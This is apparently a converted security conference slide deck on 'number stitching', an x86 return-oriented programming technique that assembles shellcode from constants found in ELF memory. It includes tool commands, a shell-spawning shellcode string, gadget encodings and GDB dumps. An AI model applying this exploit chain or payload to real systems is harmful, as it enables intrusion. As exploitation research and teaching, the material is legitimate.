# Copyright and Confidentiality Notice
© 2013-2014 Cisco and/or its affiliates. All rights reserved.
Cisco Confidential

## Scanning Memory Regions in ELF Files
- **RO Segment (contains .text, .rodata, etc.)**:
  - This segment is a good candidate because it is read-only and should not change at runtime.
  - If the binary is not Position Independent Executable (PIE), the addresses are constant.
  - Track all numbers found and their addresses.
  - Find the best combination of numbers that add up to a specific chunk.

## Approach
### Coin Change Problem
- **Example**: If you buy an item for 4.25€ and pay with a 5€ note, what is the most efficient way to return 0.75€ in change?
  - **Solution**: 
    - 1 50 cent coin
    - 1 20 cent coin
    - 1 5 cent coin
- **In Dollars**:
  - 0.75$:
    - 1 half-dollar coin
    - 1 quarter
- **Best Solution Depends on the Coin Set**:
  - In our case, the "coin set" consists of the numbers found in memory.

## Solving the Problem
- **Ideal Solution (Dynamic Programming)**:
  - Finds the most efficient solution.
  - Requires significant memory for large numbers.
  - Not scalable for very large numbers.
- **Sub-Optimal Solution (Greedy Approach)**:
  - No memory footprint.
  - Can miss the optimal solution.
  - Start with the largest number that fits, then move to smaller numbers.
  - Small numbers are easy to find in memory, making the greedy approach often successful.

### Greedy Approach Example
- **75 cents change**:
  - Try 2 euros: ✖
  - Try 1 euro: ✖
  - Try 50 cents: ✔
  - Try 20 cents: ✔
  - Try 10 cents: ✖
  - Try 5 cents: ✔
  - **Found solution**: 50 + 20 + 5 = 75 cents

## Introducing Ropnum
- **Tool to solve the coin change problem**:
  - Given a number, it finds the addresses of numbers that solve the problem.
  - Features:
    - Ignore addresses with null-bytes.
    - Exclude numbers from the solver.
    - Print all addresses pointing to a number.

### Usage
```bash
someone@something:~/somewhere$ ropnum.py -n 0x01020304 -S -s .text > /dev/null
Using segments instead of sections to perform number lookups.
Using sections [.text] for segment lookup.
Found loadable segment starting at [address 0x08048000, offset 0x00000000].
Found a solution using 5 operations: [16860748, 47811, 392, 104, 5]
0x08048002 => 0x0101464c 16860748
0x0804804c => 0x00000005 5
0x080482f6 => 0x00000068 104
0x08048399 => 0x0000bac3 47811
0x08048500 => 0x00000188 392
```

### Ropnum Continued
- **Accumulating Gadget**:
  - `add eax, [ebx+0xb8a0008]; add esp, 0x4; pop ebx; pop ebp;;`
  - By controlling the value addressed by `ebx`, you control `eax`.

## Putting It Together
- **Steps**:
  - Cut and order 4-byte shellcode chunks.
  - Add numbers found in memory until you reach a chunk.
  - Dump the chunk to a stack frame.
  - Repeat until the shellcode is complete.
  - Transfer control to the shellcode.
  - **Git Repository**: https://github.com/alexmgr/numstitch

## Summary
- **What It Does**:
  - Takes an input shellcode and a frame address.
  - Handles details like endianness, 2's complement, and padding.
  - Generates Python code to create the payload.
- **Additional Features**:
  - Add an mprotect RWE stub frame before the stack.
  - Start with an arbitrary accumulator register value.
  - Lookup numbers in sections or segments.

## Why You Need an mprotect Stub
- **RW Section**:
  - The fake stack lives in a Read-Write (RW) section.
  - You need to make the page Read-Execute (RE).
  - `mprotect` changes permissions at runtime.
  - `mprotect(page base address, page size (0x1000), RWE (0x7))`

## Example Usage
```bash
someone@something:~/somewhere$ ropstitch.py -x "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" -f 0x08049110 -S -s .text -p abinary > /dev/null
```

## Example Tool Output
- The tool outputs Python code where you need to add gadget addresses.
- Run the generated Python code to get the payload.
- **Output Details**: See `numstitch_details.txt` (Defcon CD) or https://github.com/alexmgr/numstitch

## GDB Output
- **Initial State**:
  ```gdb
  gdb-peda$ x/16w 0x804a11c
  0x804a11c: 0xb7f31e00 0x00000000 0x00000000 0x00000000
  0x804a12c: 0x00000007 0x00000000 0x00000000 0x00000000
  0x804a13c: 0x00000000 0x00000000 0x00000000 0x00000000
  0x804a14c: 0x00000000 0x00000000 0x00000000 0x00000000
  ```
- **After Writing `int 0x80`**:
  ```gdb
  0x804a11c: 0xb7f31e00 0x00000000 0x00000000 0x00000000
  0x804a12c: 0x00000007 0x00000000 0x00000000 0x00000000
  0x804a13c: 0x00000000 0x00000000 0x00000000 0x00000000
  0x804a14c: 0x00000000 0x00000080 0x00000000 0x00000000
  ```
- **After Writing `mprotect` Page Size (0x1000)**:
  ```gdb
  0x804a11c: 0xb7f31e00 0x00000000 0x00000000 0x00001000
  0x804a12c: 0x00000007 0x00000000 0x00000000 0x00000000
  0x804a13c: 0x00000000 0x00000000 0x00000000 0x00000000
  0x804a14c: 0x00000000 0x00000080 0x00000000 0x00000000
  ```
- **Later Execution**:
  ```gdb
  0x804a11c: 0xb7f31e00 0x0804a130 0x0804a000 0x00001000
  0x804a12c: 0x00000007 0x00000000 0x2d686652 0x52e18970
  0x804a13c: 0x2f68686a 0x68736162 0x6e69622f 0x5152e389
  0x804a14c: 0x00000000 0x00000080 0x00000000 0x00000000
  ```
- **End Result**:
  ```gdb
  0x804a11c: 0xb7f31e00 0x0804a130 0x0800a000 0x00001000
  0x804a12c: 0x00000007 0x99580b6a 0x2d686652 0x52e18970
  0x804a13c: 0x2f68686a 0x68736162 0x6e69622f 0x5152e389
  0x804a14c: 0xcde18953 0x00000080 0x00000000 0x00000000
  ```

## Pros and Cons
- **Pros**:
  - Can encode any shellcode (no null-byte problem).
  - Lower 2 bytes can be controlled by excluding those values from the addresses.
  - Not affected by RELRO, ASLR, or X^W.
- **Cons**:
  - Payloads can be large, depending on the availability of numbers.
  - Requires a big stage-0 or a gadget table.

## Further Usage
- **Initialize EAX**:
  - In stdcall convention, `eax` holds the return value of a function call.
  - Call any function in the PLT to control the return value.

## Shrink the Size of Stage-0
- **Gadget Table**:
  - Use number stitching to load further gadgets instead of shellcode.
  - Example:
    - `Pop ecx; ret;` => `59 c3`
    - `Pop ebx; ret;` => `5b c3`
    - `mov [ecx] ebx; ret;` => `89 19 c3`
  - Shellcode becomes: `\x59\xc3\x5b\xc3\x89\x19\xc3`

## Future Work
- **Search for Numbers in Memory Not Subject to ASLR**:
  - Check binaries with PIE enabled.
- **Support for Large Numbers**:
  - Implement dynamic programming for large numbers.
  - Add 64-bit support.
- **Mixed Approach**:
  - String copying for available bytes.
  - Number stitching for others.
- **Contribute to ROP Tools**:
  - Simplify the concept of gadget tables in the tool.

## Contact Details
- **Email**: PI:EMAIL
- **GitHub**: https://github.com/alexmgr/numstitch
- **Author**: Alex Moneger

Thank you!